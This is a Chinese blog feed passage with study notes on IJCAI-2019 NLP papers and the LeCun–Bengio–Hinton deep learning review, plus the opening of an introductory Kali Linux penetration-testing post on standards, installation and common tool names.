class="line">被具体化为带权重的词袋（ weighted bag of words， WBoW ）。不难理解，每个主题词都</span><br><span class="line">刻画了关系的某些方面，而词的权重则刻画了它对关系的重要性。因此，一个被标注为该关系的</span><br><span class="line">句子应该匹配关系的某些重要方面。</span><br><span class="line"></span><br><span class="line">2. 方法</span><br><span class="line">* 上图左边表示了应用关系的主题知识的框架流程图，主要步骤为:</span><br><span class="line">  * 步骤1：从训练句子中检索关系r的所有句子。</span><br><span class="line">  * 步骤2：获取 r 的主题知识，即通过主题建模从r的标记句子集合中提取前k个加权主题词。</span><br><span class="line">  * 步骤3：为句子-关系对（ s; r ）建立深度匹配网络。</span><br><span class="line">  * 步骤4：基于主题知识，通过 Word Mover Distance（ WMD ）计算 s 和 r 之间的语义距离 d ( s,r )。</span><br><span class="line">  * 步骤5：根据语义距离 d ( s,r ) 计算样本的重要性权重。</span><br><span class="line">  * 步骤6：基于深度匹配网络和样本重要性权重建立损失函数。</span><br><span class="line">* 上图右图表示了句子关系匹配网络，主要包括三个部分:</span><br><span class="line">  * 句子学习模块</span><br><span class="line">    * 按照头尾实体的位置，我们将句子分成三部分。主要原因有两个。第一：在一个句子中，表达实体对关系的往往位于实体对之间。因此，每部分对于关系推理的贡献是不一样的。第二，为了后续注意力机制的处理，将句子分块可以显著提升效率。句子学习模块主要采用多头的注意力机制（ multi-head self-attention ）。此外，关系敏感的注意力机制（ relation-awareattention ）旨在将学习到的句子特征中关系敏感的部分抽取出来，从而降低噪声的影响。</span><br><span class="line">  * 关系学习模块</span><br><span class="line">    * 关系学习模块的输入是关系的主题词集合。在该模块中，我们仍采用自注意力机制。但值得注意的是，在输入词袋中我们考虑了每个词的先验权重，因此，我们希望在自注意力机制学习中将该先验权重考虑进去。这在 weighted multi-head self-attention 中实现。</span><br><span class="line">  * 句子关系匹配模块</span><br><span class="line">    * 基于学到的句子表示和关系表示，我们采用简单的全连接操作实现匹配建模</span><br></pre></td></tr></table></figure><h3 id="4-IJCAI-2019-NLP-WorkShop的研讨热点回顾"><a href="#4-IJCAI-2019-NLP-WorkShop的研讨热点回顾" class="headerlink" title="4. IJCAI-2019 NLP WorkShop的研讨热点回顾"></a>4. IJCAI-2019 NLP WorkShop的研讨热点回顾</h3><ul><li>W4 Financial Technology and Natural Language Processing (FinNLP)</li></ul><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">W4: </span><br><span class="line">Leveraging BERT to Improve the FEARS Index for Stock  Forecasting </span><br><span class="line">   利用BERT改进股票预测的FEARS指数</span><br><span class="line">“Financial and Economic Attitudes Revealed by Search (FEARS) index </span><br><span class="line">reflects the attention and sentiment of public investors and is an</span><br><span class="line">important factor for predicting stock price return. In this paper, </span><br><span class="line">we take into account the semantics of the FEARS search terms by leveraging </span><br><span class="line">the Bidirectional Encoder Representations from Transformers (BERT), </span><br><span class="line">and further apply a self-attention deep learning model to our refined FEARS </span><br><span class="line">seamlessly for stock return prediction. We demonstrate the practical benefits </span><br><span class="line">of our approach by comparing to baseline works.”</span><br></pre></td></tr></table></figure><ul><li>W11 Semantic Deep Learning (SemDeep) 语义深度学习</li><li>W12 Big Social Media Data Management and Analysis (BSMDMA) 社交大数据的管理与分析</li><li>W16 Linguistic and Cognitive Approaches to Dialogue Agents (LaCATODA)  对话Agents的语言与认知方法</li><li>W17 Bringing Semantic Knowledge into Vision and Text Understanding  将语义知识引入视觉和文本理解</li><li>W22 Search-Oriented Conversational AI (SCAI)  面向搜索的对话Ai</li><li>W31 Language Sense on Computer 计算机语感</li><li>W45 Natural Language Processing for Social Media (SocialNLP) 社交媒体自然语言处理</li></ul><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Natural Language Processing for Social Media (SocialNLP)</span><br><span class="line">Ex-Twit: Explainable Twitter Mining on Health Data</span><br><span class="line">   Ex-Twit:可解释的Twitter健康数据挖掘</span><br><span class="line">“Since most machine learning models provide no explanations </span><br><span class="line">for the predictions, their predictions are obscure for the human. </span><br><span class="line">The ability to explain a model&apos;s prediction has become a necessity </span><br><span class="line">in many applications including Twitter mining. In this work, </span><br><span class="line">we propose a method called Explainable Twitter Mining (Ex-Twit)</span><br><span class="line">combining Topic Modeling and Local Interpretable Model-agnostic</span><br><span class="line">Explanation (LIME) to predict the topic and explain the model predictions.</span><br><span class="line">We demonstrate the effectiveness of Ex-Twit on Twitter health-related data.”</span><br></pre></td></tr></table></figure><h2 id="4-IJCAI-2019-NLP领域在学界和产业界的探讨"><a href="#4-IJCAI-2019-NLP领域在学界和产业界的探讨" class="headerlink" title="4.IJCAI-2019 NLP领域在学界和产业界的探讨"></a>4.IJCAI-2019 NLP领域在学界和产业界的探讨</h2><hr><ul><li>覆盖面较广，多不同领域学科的投稿。实用性较强，不拘泥于学术研究，很多业界的工具和技术的展示也在其中占有重要的分量。</li><li>创新性较强，较其它领域会议有较多跨领域的前沿方向探索。</li><li>参会人员多样，研究领域各不相同。业界人员参会数量大</li><li>国人在NLP领域内扮演重要角色</li><li>更多强调真实世界数据、实际应用场景的研究的出现</li></ul><blockquote><p>不足之处，欢迎批评指正</p></blockquote><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">参考文献:</span><br><span class="line"></span><br><span class="line">[1] https://www.zhihu.com/search?type=content&amp;q=IJCAI%E4%BC%9A%E8%AE%AE%E4%BB%8B%E7%BB%8D</span><br><span class="line"></span><br><span class="line">[2] https://www.zhihu.com/search?type=content&amp;q=ijcai%202020%20NLP%20%E8%AE%BA%E6%96%87%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A</span><br><span class="line"></span><br><span class="line">[3] https://www.paperdigest.org/2019/08/ijcai-2019-highlights/</span><br><span class="line"></span><br><span class="line">[4] https://zhuanlan.zhihu.com/p/74574073</span><br><span class="line"></span><br><span class="line">[5] https://www.aminer.cn/research_report/5cecc3f41976c5c87c8bee63</span><br><span class="line"></span><br><span class="line">[6] https://zhuanlan.zhihu.com/p/81073607</span><br><span class="line"></span><br><span class="line">[7] https://www.ijcai.org/Proceedings/2019/0728.pdf</span><br><span class="line"></span><br><span class="line">[8] https://www.ijcai.org/proceedings/2019/0725.pdf</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【论文调研】IJCAI-2019-论文投稿与录用调研报告&quot;&gt;&lt;a href=&quot;#【论文调研】IJCAI-2019-论文投稿与录用调研报告&quot; class=&quot;headerlink&quot; title=&quot;【论文调研】IJCAI-2019 论文投稿与录用调研报告&quot;&gt;&lt;/a&gt;【论文调研】IJCAI-2019 论文投稿与录用调研报告&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;本文主要为IJCAI-2019 论文投稿与录用调研报告&lt;/p&gt;
    
    </summary>
    
      <category term="论文调研" scheme="https://Wheeeeeeeeels.github.io/categories/%E8%AE%BA%E6%96%87%E8%B0%83%E7%A0%94/"/>
    
    
      <category term="自然语言处理" scheme="https://Wheeeeeeeeels.github.io/tags/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86/"/>
    
      <category term="IJCAI" scheme="https://Wheeeeeeeeels.github.io/tags/IJCAI/"/>
    
      <category term="知识图谱" scheme="https://Wheeeeeeeeels.github.io/tags/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/"/>
    
      <category term="图卷积网络" scheme="https://Wheeeeeeeeels.github.io/tags/%E5%9B%BE%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C/"/>
    
      <category term="关系抽取" scheme="https://Wheeeeeeeeels.github.io/tags/%E5%85%B3%E7%B3%BB%E6%8A%BD%E5%8F%96/"/>
    
      <category term="链接预测" scheme="https://Wheeeeeeeeels.github.io/tags/%E9%93%BE%E6%8E%A5%E9%A2%84%E6%B5%8B/"/>
    
      <category term="会议投稿" scheme="https://Wheeeeeeeeels.github.io/tags/%E4%BC%9A%E8%AE%AE%E6%8A%95%E7%A8%BF/"/>
    
  </entry>
  
  <entry>
    <title>【论文解读】深度学习综述</title>
    <link href="https://Wheeeeeeeeels.github.io/2019/08/01/%E3%80%90%E8%AE%BA%E6%96%87%E8%A7%A3%E8%AF%BB%E3%80%91%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BB%BC%E8%BF%B0/"/>
    <id>https://Wheeeeeeeeels.github.io/2019/08/01/【论文解读】深度学习综述/</id>
    <published>2019-08-01T04:41:34.000Z</published>
    <updated>2020-03-13T12:36:25.186Z</updated>
    
    <content type="html"><![CDATA[<h4 id="【论文解读】-深度学习综述-Deep-Learning"><a href="#【论文解读】-深度学习综述-Deep-Learning" class="headerlink" title="【论文解读】  深度学习综述(Deep Learning)"></a>【论文解读】  深度学习综述(Deep Learning)</h4><hr><blockquote><p>本文主要是Paper论文精读系列第一篇文章主要关于深度学习综述的内容</p></blockquote><a id="more"></a><blockquote><p>0.1 论文介绍和作者介绍</p><ul><li>作者: Yann LeCun, Yoshua Bengio, Geoffrey Hinton</li><li>Geoffrey Hinton <ul><li>多伦多大学</li><li>1986 反向传播算法</li><li>1983 发明波尔茨曼机</li><li>2012 对卷积神经网络进行改进<ul><li>Yann LeCun</li><li>1980 发明卷积神经网络</li><li>1980末 首次将卷积神经网络用于手写数字识别</li><li>Yoshua Bengio</li><li>蒙特利尔大学</li><li>1990 将神经网络和概率模型结合在一起</li><li>2000 使用高维词向量来表征自然语言处理</li><li>文章发表时间:2015</li></ul></li></ul></li></ul></blockquote><blockquote><p>0.2 论文意义和主要内容</p><ul><li>论文意义: <ul><li>总览深度理论,模型,展开人工智能的新蓝图</li><li>探究深度学习最重要的算法和理论</li></ul></li><li>主要内容<ul><li>概念:<ul><li>深度学习允许多个处理层组成的计算模型来学习具有多个抽象级别的数据表示,这些方法极大地改善了语音识别</li><li>改善了视觉对象识别,物体检测以及药物发现和基因组等其他领域的技术</li></ul></li><li>原理:<ul><li>深度学习通过使用反向传播算法来指示机器应该如何更改其内部参数(用于从前一层的表示计算每个层中的表示)来发现大数据集中的复杂结构<ul><li>应用:</li></ul></li><li>深度卷积网络CNN在处理图像,视频,语音和音频带来了突破</li><li>而循环神经网络对文本和语音等顺序数据进行了彰显</li></ul></li></ul></li></ul></blockquote><blockquote><p>0.3 论文结构:</p><ul><li>1.引言 Introduction</li><li>2.监督学习 Supervised Learning (P1-P3)</li><li>3.反向传播算法 BackPropagation</li><li>4.卷积神经网络 CNN Convolutional neural networks</li><li>5.基于深度神经网络的图片理解 Image understanding</li><li>6.分布表示和语言模型 Language processing</li><li>7.循环神经网络 RNN Recurrent neural networks</li><li>8.深度学习的未来 The future</li></ul></blockquote><blockquote><p>0.4 前期知识储备</p><ul><li>了解基本的机器学习算法</li><li>RNN: 循环神经网络,掌握RNN的基本工作原理</li><li>CNN: 了解神经网络的结构和工作原理<br>0.5 课程安排和学习建议</li><li>day1 论文视频讲解</li><li>day2 泛读论文,已经标注了重点</li><li>day3 论文视频讲解</li><li>day4 精读论文,写分析笔记</li><li>day5 论文视频讲解</li><li>day6 作业,撰写博客</li></ul></blockquote><blockquote><p>0.6 学习建议</p><ul><li>精读经典论文</li><li>跟进最新论文</li><li>整理关注论文</li><li>复现领域论文<ul><li>加深对论文的理解</li><li>提高算法的能力</li></ul></li><li>写作论文</li></ul></blockquote><blockquote><p>1.引言</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQM7V.png" alt="3cQM7V.png"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解释: 深度学习方法是拥有多级表示的学习方法,通过组合简单但非线性的模块来获得,每个模块将表示一个级别,从原始的输入开始转换为更高的表示,稍微更多的抽象层次呢,能够足够地组合这种变换,可以学习非常复杂的功能</span><br><span class="line"></span><br><span class="line">简单的方式理解: 用深度学习的方式和方法,多层的神经网络,来找到一个函数,这个函数能够被学习,这个函数最后能够表示非常复杂的功能比如语音识别,比如图片识别.</span><br></pre></td></tr></table></figure><blockquote><p>1.1 多层神经网络</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQmXn.png" alt="3cQmXn.png"></p><ul><li>Multipe Layers of simple units</li><li>Each units compute a weighted sum of its inputs</li><li>Weighted sum is passed through a non-linear function</li><li>The learning algorithm changes the weights</li><li>激活函数:ReLU <blockquote><p>1.2 深度学习应用领域</p><ul><li>计算机视觉<ul><li>无人驾驶</li><li>图片识别领域</li></ul></li><li>自然语言处理<ul><li>智能搜索</li><li>人机会话等</li></ul></li><li>医学图像分析</li><li>自动驾驶</li><li>制药等</li></ul><p>1.3 深度学习的应用举例</p><ul><li>机器翻译</li><li>下围棋</li><li>目标检测</li><li>人脸识别</li><li>自动驾驶 </li></ul></blockquote></li></ul><blockquote><p>2 监督学习(Supervised Learning)</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQK00.png" alt="3cQK00.png"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解释: 我们需要计算一个目标函数来测量出分数与所需分数之间的误差,其实就是距离,然后内部修改其内部的参数减少此错误(BP反向传播),这些可调的参数,我们通常称之为权重,是实数,可以看作是定义机器输入与输出功能的旋钮.在典型的机器学习系统中,可能存在这种可以调节的数以亿计的权重.以及可以训练机器数以亿计的这些示例.</span><br><span class="line"></span><br><span class="line">简单解释:我们有答案,也有数据,需要找到答案和数据之间的规律,而这些规律是什么,就好比调节收音机的旋钮一样,需要去调节参数,使用的是BP算法</span><br></pre></td></tr></table></figure><blockquote><p>2.1 梯度下降算法</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQumq.png" alt="3cQumq.png"></p><p><img src="https://s2.ax1x.com/2020/03/01/3cQlkT.png" alt="3cQlkT.png"></p><p>直观解释:从山上某点到山谷的过程</p><p><img src="https://s2.ax1x.com/2020/03/01/3cQ1tU.png" alt="3cQ1tU.png"></p><blockquote><p>3 反向传播算法(Backpropagation)(P4-P6)</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQ3hF.png" alt="3cQ3hF.png"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解释: </span><br><span class="line">    图(a) 仅仅包括2个输入层,2个隐藏层,1个输出层的示例</span><br><span class="line">    图(b) 链式法则</span><br><span class="line">    图(c) 正向传播</span><br><span class="line">    图(d) 反向传播</span><br></pre></td></tr></table></figure><blockquote><p>3.1 链式法则(Chain Rule)</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQGp4.png" alt="3cQGp4.png"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">链式法则: </span><br><span class="line"> Case1:</span><br><span class="line">   x的微小变化引起y的微小变换,同时y的微小变换有引起z的微小变化</span><br><span class="line"> Case2:</span><br><span class="line">    该case表明链式法则可能不仅仅是影响一个因素,也可能影响多个因素</span><br></pre></td></tr></table></figure><blockquote><p>3.2 反向传递(Backward transfer)</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQJ1J.png" alt="3cQJ1J.png"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Forward Pass: 从前向后,是一个计算的过程</span><br><span class="line">Backward Pass: 从后向前,是一个误差传递的过程,误差传递的过程也就是学习的过程</span><br></pre></td></tr></table></figure><blockquote><p>4 卷积神经网络 CNN</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQtXR.png" alt="3cQtXR.png"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">萨摩耶犬的图像识别</span><br><span class="line">  - rgb三个层次</span><br><span class="line">  - 识别是萨摩耶还是狼狗</span><br><span class="line">  - 信息自下而上的流动</span><br><span class="line">  - 较低级别的特征充当边缘的检测器,并输出每一个图像类别的计算分数</span><br><span class="line">  - 通过不同层来进行特征的获取</span><br></pre></td></tr></table></figure><blockquote><p>4.1 什么是CNN?</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQUn1.png" alt="3cQUn1.png"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">卷积神经网络的过程:</span><br><span class="line">  1. 预处理的数据用于卷积的计算,加上bias得到局部特征,其卷积核的尺寸和个数对模型的效果有一定的影响</span><br><span class="line">  2. 将第1步的输出结果进行非线性函数的处理,如目前常用的ReLU函数.</span><br><span class="line">  3. 进行池化操作,所谓池化操作实际是取出区域的平均值或者最大值,保留显著的特征,提升对激变的容忍能力</span><br><span class="line">  4. 全连接层,表示对结果的确认.</span><br></pre></td></tr></table></figure><p>动画演示如下:<br><img src="https://s2.ax1x.com/2020/03/01/3cQRBt.gif" alt="3cQRBt.gif"></p><blockquote><p>5 CNN理解图片(Understanding Image by CNN)</p></blockquote><p>看图说话:<br><img src="https://s2.ax1x.com/2020/03/01/3cQo9g.png" alt="3cQo9g.png"></p><blockquote><p>6.分布式表示和语言模型(Language processing)</p></blockquote><blockquote><p>6.1 理解Embedding(Understanding Embedding)</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQ7cj.png" alt="3cQ7cj.png"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">独立热编码: 1个位置代表一个词意,但是不能代表一个词真正的意思,one-hot 会维度很大</span><br><span class="line">Word Embedding: 相近的词汇有相近的意思</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/03/01/3cQHjs.png" alt="3cQHjs.png"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 句子也可以进行Embedding</span><br><span class="line">- word embedding</span><br><span class="line">- sentence embedding</span><br></pre></td></tr></table></figure><blockquote><p>6.2 Word2Vec算法(2013提出)</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQ54S.png" alt="3cQ54S.png"></p><blockquote><ol start="7"><li>循环神经网络</li></ol></blockquote><blockquote><p>7.1 理解RNN</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQLBq.png" alt="3cQLBq.png"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">循环神经网络的特点如上所述:</span><br><span class="line">   - 时间序列</span><br><span class="line">   - 隐藏层会保持以前的数据</span><br><span class="line">   - 带有存储功能的神经网络</span><br></pre></td></tr></table></figure><blockquote><p>7.2 LSTM(Long Short-term Memory)</p></blockquote><p><img src="https://s2.ax1x.com/2020/03/01/3cQOH0.png" alt="3cQOH0.png"></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 特殊的RNN,也是门限RNN</span><br><span class="line">2. 主要解决RNN训练过程中梯度消失和梯度爆炸的问题</span><br><span class="line">3. 比普通的RNN更好</span><br></pre></td></tr></table></figure><blockquote><ol start="8"><li>未来(Future)</li></ol></blockquote><ul><li><p>非监督学习<br><img src="https://s2.ax1x.com/2020/03/01/3cQjEV.png" alt="3cQjEV.png"></p></li><li><p>强化学习<br><img src="https://s2.ax1x.com/2020/03/01/3cQvNT.png" alt="3cQvNT.png"></p></li><li><p>GAN(Generative Aversarial Networks)<br><img src="https://s2.ax1x.com/2020/03/01/3clp34.png" alt="3clp34.png"></p></li><li><p>自监督学习</p></li></ul><p><img src="https://s2.ax1x.com/2020/03/01/3cl9gJ.png" alt="3cl9gJ.png"></p><blockquote><p>问题:</p><ul><li>提高入读门槛,多看顶会论文</li><li>看论文先读摘要,绪论以及结论部分,了解论文的核心内容,契合研究方向进行精度细粒读</li><li>代码复现可取github</li><li>调参技巧:<ul><li>模型参数大于数据量大时,相当于求解一个欠定方程,容易多解,过拟合</li><li>模型参数远小于数据量时,相当于求解超定方程,可能误解,或有解但准确率低,欠拟合</li><li>模型参数如何与数据量做到匹配,是一个工程问题,需要结合问题和数据量多做</li></ul></li><li>如何确定一层卷积使用多少个卷积核<ul><li>卷积核的个数要随具体问题数据量参数大小等决定,没有绝对的方法定多少个</li><li>卷积核其实就是最后用于提取特征的映射函数的参数,随具体训练而定,刚开始随机初始化,后面逐渐进行优化,所以最后不会一模一样<ul><li>为什么CNN可以提取特征?卷积是如何把特征提取出来的?</li><li>CNN是利用卷积操作提取特征,32个卷积核就是学习32种特征,卷积操作其实就是对应内积再求和,不同位置结果不变,具有空间位移不变性,所以可以提取特征</li></ul></li></ul></li><li>激活函数的作用:<ul><li>给神经网络中添加非线性因素,提供了网络的非线性建模能力,通过定义对神经元节点输出的映射,本质上是将输入x映射到(-1,1)或者(0,1)的实数空间,即输入向量与权重的内积再加上bias经过激活函数映射处理之后再做为输出<ul><li>损失函数:</li><li>使用1/2 比较好求导</li><li>自监督学习与无监督学习的本质区别</li></ul></li></ul></li></ul></blockquote><ul><li>全连接层的作用:<ul><li>最后将前面的隐藏层学习到的”分布式特征表示”映射到样本标记空间</li></ul></li><li>卷积核的本质就是神经元间连接参数的权重</li><li>反向传播本质上是不断优化卷积核里的数值,最终提取到图像的特征</li><li>激活函数在卷积神经网络中的作用:</li></ul><p><img src="https://s2.ax1x.com/2020/03/01/3clCv9.png" alt="3clCv9.png"><br><img src="https://s2.ax1x.com/2020/03/01/3cliuR.png" alt="3cliuR.png"><br><img src="https://s2.ax1x.com/2020/03/01/3clFD1.png" alt="3clFD1.png"><br><img src="https://s2.ax1x.com/2020/03/01/3clkHx.png" alt="3clkHx.png"><br><img src="https://s2.ax1x.com/2020/03/01/3clEE6.png" alt="3clEE6.png"><br><img src="https://s2.ax1x.com/2020/03/01/3clVUK.png" alt="3clVUK.png"><br><img src="https://s2.ax1x.com/2020/03/01/3clZ4O.png" alt="3clZ4O.png"><br><img src="https://s2.ax1x.com/2020/03/01/3clmCD.png" alt="3clmCD.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;【论文解读】-深度学习综述-Deep-Learning&quot;&gt;&lt;a href=&quot;#【论文解读】-深度学习综述-Deep-Learning&quot; class=&quot;headerlink&quot; title=&quot;【论文解读】  深度学习综述(Deep Learning)&quot;&gt;&lt;/a&gt;【论文解读】  深度学习综述(Deep Learning)&lt;/h4&gt;&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;本文主要是Paper论文精读系列第一篇文章主要关于深度学习综述的内容&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="论文解读" scheme="https://Wheeeeeeeeels.github.io/categories/%E8%AE%BA%E6%96%87%E8%A7%A3%E8%AF%BB/"/>
    
    
      <category term="深度学习" scheme="https://Wheeeeeeeeels.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="计算机视觉" scheme="https://Wheeeeeeeeels.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89/"/>
    
  </entry>
  
  <entry>
    <title>【Kali 渗透测试】入门篇</title>
    <link href="https://Wheeeeeeeeels.github.io/2019/07/31/%E3%80%90Kali%20LInux%E3%80%91%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8/"/>
    <id>https://Wheeeeeeeeels.github.io/2019/07/31/【Kali LInux】 渗透测试技术入门/</id>
    <published>2019-07-31T04:41:34.000Z</published>
    <updated>2020-03-13T12:20:53.575Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>作为渗透测试的第一篇文章,本文主要将带领你进行基础的渗透测试学习,若想要进一步学习可参考更多渗透测试以及黑客入侵与防御书籍</p></blockquote><a id="more"></a><h2 id="Kali-Linux-从入门到精通-一-概论"><a href="#Kali-Linux-从入门到精通-一-概论" class="headerlink" title="Kali Linux 从入门到精通(一)-概论"></a>Kali Linux 从入门到精通(一)-概论</h2><blockquote><p>基本介绍</p><ul><li>1.安全目标<ul><li>先于攻击者发现和防止漏洞出现<ul><li>攻击型安全</li><li>防护型安全</li></ul></li></ul></li><li>2.渗透测试<ul><li>尝试挫败安全防御机制,发现系统安全弱点</li><li>从攻击者的角度思考,测量安全防护有效性</li><li>证明安全问题的存在,而非破坏</li><li>道德约束</li><li>法律</li></ul></li></ul></blockquote><ul><li>3.渗透测试标准(The Penetration Testing Execution Standard)<ul><li>PETS (<a href="http://www.pentest-standard.org" target="_blank" rel="noopener">http://www.pentest-standard.org</a>) </li><li>前期交互阶段:需要划清范围,通常划分为多个子系统进行渗透测试</li><li>情报收集阶段:主动收集,被动收集</li><li>威胁建模阶段:逆向工程,编写针对漏洞的代码</li><li>漏洞分析阶段</li><li>渗透攻击阶段</li><li>后渗透测试阶段</li><li>渗透测试报告</li></ul></li><li>4.渗透测试项目<ul><li>渗透测试范围</li><li>获得授权(客户授权)</li><li>渗透测试方法<ul><li>是否允许社会工程学</li><li>是否允许拒绝服务攻击</li></ul></li></ul></li><li>5.渗透测试误区<ul><li>扫描器就是一切&lt;==只是一种手段<ul><li>忽视业务逻辑重的漏洞</li></ul></li></ul></li><li>6.KALI Linux介绍<ul><li>基于Debain的Linux发行版本</li><li>前身是BackTrack 2013年3月发布</li><li>用于渗透测试和安全审计</li><li>包含600+安全工具</li><li>FHS标准目录结构</li><li>定制内核</li><li>支持ARM和手机平台</li><li>开源免费 </li></ul></li><li>7.KALI LINUX 策略<ul><li>ROOT用户策略</li><li>网络服务策略</li><li>更新升级策略</li></ul></li></ul><ul><li>8.建议<ul><li>实践是检验真理的唯一标准</li><li>不要停留在了解的程度</li><li>Kali很强大,但不是全部</li></ul></li></ul><h2 id="Kali-Linux-从入门到精通-二-安装"><a href="#Kali-Linux-从入门到精通-二-安装" class="headerlink" title="Kali Linux 从入门到精通(二)-安装"></a>Kali Linux 从入门到精通(二)-安装</h2><blockquote><p>Kail Linux 安装</p></blockquote><ul><li>持久加密USB安装-1<ul><li>LUSK:Linux Unified Key Setup<ul><li>磁盘分区加密规范</li><li>不依赖与操作系统的磁盘级加密</li><li>Window——-DoxBox</li><li>后端: dm-crypt</li><li>前端: crtptsetup</li><li>微软的bitlocker</li></ul></li><li>将镜像刻录到U盘<ul><li>dd if=kali-linux-version.iso of=/dev/sd* bs=1M(if–input file of=output file bs具体传输块的大小)</li></ul></li></ul></li><li>持久加密USB安装-2<ul><li>为U盘创建额外分区</li><li>使用LUKS加密分区</li><li>打开加密分区</li><li>格式化加密分区+卷标</li><li>挂在加密分区,并创建persistence.conf文件<blockquote><p>熟悉环境</p><ul><li>登录密码:官方下载:用户root 密码为toor</li><li>top10安全工具</li><li>aircrack-ng 无线安全攻击套件</li><li>brupsuite:基于web,手动web渗透测试工具,通过截断客户端到服务器的请求,通过变更数据查看漏洞</li><li>hydra:密码破解工具</li><li>john:密码破解工具</li><li>maltgo:收集信息,层级性的信息收集手段,根据有限信息,收集大量信息</li><li>metasplot framework:渗透测试框架,可以替代很多安全工具,一体化作战工具</li><li>nmap:网络发现层的扫描器,网络扫描工具</li><li>owasp-zap:与brupsuit属于一类工具</li><li>sqlmap: sql注入工具</li><li>wireshark: 抓包分析工具</li><li>字体调整</li><li>监视网络流量</li><li>强行终止程序</li><li>文件目录</li><li>共享文件 </li></ul></blockquote></li></ul></li></ul><blockquote><p>Kali 目录结构</p><ul><li>bin:所有用户使用的执行程序目录</li><li>root: 引导程序目录:如grup</li><li>dev:设备目录</li><li>etc:配置文件目录</li><li>home:用户主目录</li><li>lib: 放置各种库文件目录</li><li>lib64</li><li>lost+found: 丢失文件目录</li><li>media:挂载外接目录</li><li>mnt</li><li>opt:应用程序目录</li><li>proc</li><li>root</li><li>sbin</li><li>selinux</li><li>srv</li><li>sys</li><li>sbin</li><li>share</li><li>var:日志,存放经常变动的目录</li></ul></blockquote><blockquote><p>熟悉常用bash命令</p><ul><li>ls:相当于dir<ul><li>ls -l:<ul><li>前面字符:d 表示目录 - 表示文件 l 